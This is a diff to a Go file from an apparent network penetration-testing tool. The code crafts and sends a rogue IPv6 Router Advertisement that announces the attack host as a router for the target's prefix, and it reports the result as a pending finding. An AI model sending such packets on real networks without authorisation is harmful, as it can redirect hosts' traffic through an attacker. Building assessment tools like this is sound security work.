@@ -2,7 +2,8 @@
 //
 // Durability (from the catalog): transient-decay. The attack sends a
 // Router Advertisement claiming to be a router with a ~1800s lifetime.
-// The RA lifetime decays after the attack stops; no explicit teardown.
+// The RA lifetime runs out on its own after the attack stops, so there is
+// no explicit teardown.
 
 package ip6
 
@@ -18,7 +19,7 @@ import (
 	"go.aledante.io/FlowSeer/src/common/errs"
 
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 )
 
 type rogueRAFinding struct {
@@ -28,33 +29,42 @@ type rogueRAFinding struct {
 	DecayNote      string `json:"decay_note"`
 }
 
-// RunRogueRA sends a Router Advertisement claiming to be a router with
-// a ~1800s lifetime and a prefix announcement.
-func RunRogueRA(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
+// RunRogueRA sends one Router Advertisement for the target's IPv6 prefix
+// from the attack leg's MAC and its EUI-64 link-local address, with the
+// 1800 s router lifetime the catalog carries as the decay bound. The
+// preferred lifetime and flags are probe content. The verdict is pending:
+// whether hosts took the router needs a probe of their tables it does not
+// have.
+func RunRogueRA(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldPrefix6); err != nil {
+		return check.Verdict{}, err
+	}
+	src := deps.AttackLeg.Addr().MAC
 
-	pkt, err := craftRogueRA(src)
+	pkt, err := craftRogueRA(src, deps.Target.Prefix6)
 	if err != nil {
-		return errs.Wrap(err, "roguera: craft RA")
+		return check.Verdict{}, errs.Wrap(err, "roguera: craft RA")
 	}
 	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
-		return errs.Wrap(err, "roguera: send RA")
+		return check.Verdict{}, errs.Wrap(err, "roguera: send RA")
 	}
 
 	detail, _ := json.Marshal(rogueRAFinding{
 		Action:         "rogue-router-advertisement",
 		RouterLifetime: 1800,
-		Prefix:         "fd00::/64",
+		Prefix:         deps.Target.Prefix6.String(),
 		DecayNote:      "~1800s lifetime announced",
 	})
 	deps.Emitter.Finding("ra", detail)
 
-	return nil
+	return check.Pending("no observable: router acceptance needs a probe of a host's router list"), nil
 }
 
-// craftRogueRA builds a Router Advertisement from the rogue router.
-func craftRogueRA(src net.HardwareAddr) ([]byte, error) {
+// craftRogueRA builds a Router Advertisement from the rogue router
+// announcing prefix.
+func craftRogueRA(src net.HardwareAddr, prefix *net.IPNet) ([]byte, error) {
 	linkLocal := linkLocalFromMAC(src)
+	prefixLen, _ := prefix.Mask.Size()
 
 	eth := &layers.Ethernet{
 		DstMAC:       allNodesMAC,
@@ -73,13 +83,13 @@ func craftRogueRA(src net.HardwareAddr) ([]byte, error) {
 	}
 	_ = icmp.SetNetworkLayerForChecksum(ip)
 
-	// Prefix info option: prefix fd00::/64, valid 1800s, preferred 1200s.
+	// Prefix info option: the prefix, valid 1800s, preferred 1200s.
 	prefixData := make([]byte, 30)
-	prefixData[0] = 64                                 // prefix length
+	prefixData[0] = byte(prefixLen)
 	prefixData[1] = 0xC0                               // flags: L=1, A=1
 	binary.BigEndian.PutUint32(prefixData[2:6], 1200)  // preferred
 	binary.BigEndian.PutUint32(prefixData[6:10], 1800) // valid
-	copy(prefixData[14:30], net.ParseIP("fd00::").To16())
+	copy(prefixData[14:30], prefix.IP.To16())
 
 	ra := &layers.ICMPv6RouterAdvertisement{
 		HopLimit:       64,
